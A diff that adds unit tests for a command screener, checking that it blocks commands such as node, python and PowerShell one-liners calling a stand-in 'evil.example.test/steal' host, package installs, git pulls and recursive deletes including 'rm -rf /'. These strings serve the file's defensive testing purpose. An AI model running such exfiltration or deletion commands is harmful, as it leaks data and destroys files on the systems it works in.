@@ -46,6 +46,22 @@ describe("screenCommand", () => {
     expect(res.reason).toMatch(/non-local host/i);
   });
 
+  it("blocks remote URLs embedded in alternate clients", () => {
+    for (const cmd of [
+      "node -e \"fetch('https://evil.example.test/steal')\"",
+      "python -c \"import requests; requests.get('https://evil.example.test/steal')\"",
+      'powershell -Command "Invoke-WebRequest https://evil.example.test/steal"',
+    ]) {
+      expect(screenCommand(cmd).allowed, cmd).toBe(false);
+    }
+  });
+
+  it("blocks remote fetches, package installation, and Windows recursive delete", () => {
+    for (const cmd of ["git pull origin main", "pnpm install", "Remove-Item -Recurse reports"]) {
+      expect(screenCommand(cmd).allowed, cmd).toBe(false);
+    }
+  });
+
   it("gives a human-readable reason for blocks", () => {
     const res = screenCommand("rm -rf /");
     expect(res.allowed).toBe(false);
